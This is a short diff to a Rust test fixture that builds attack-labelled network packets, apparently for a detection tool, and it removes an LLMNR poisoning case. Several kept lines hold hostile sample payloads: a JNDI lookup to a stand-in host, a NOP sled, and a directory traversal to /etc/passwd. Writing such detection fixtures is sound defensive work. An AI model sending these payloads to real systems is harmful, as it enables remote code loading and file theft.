@@ -37,7 +37,6 @@ fn fixture(name: &str) -> Packet {
             packet("HTTP", 8080, "", b"${jndi:ldap://example.test/x}".to_vec())
         }
         "Shellcode NOP sled" => packet("TCP", 4444, "", vec![0x90; 20]),
-        "LLMNR Poisoning" => packet("UDP", 5355, "", vec![0; 20]),
         "NBNS WPAD Poisoning" => packet("NBNS", 137, "", vec![0x00, 0x20, 0x43, 0x4b]),
         "Directory Traversal" => packet("HTTP", 80, "", b"../../../../../../etc/passwd".to_vec()),
         "SQL Injection Probe" => {
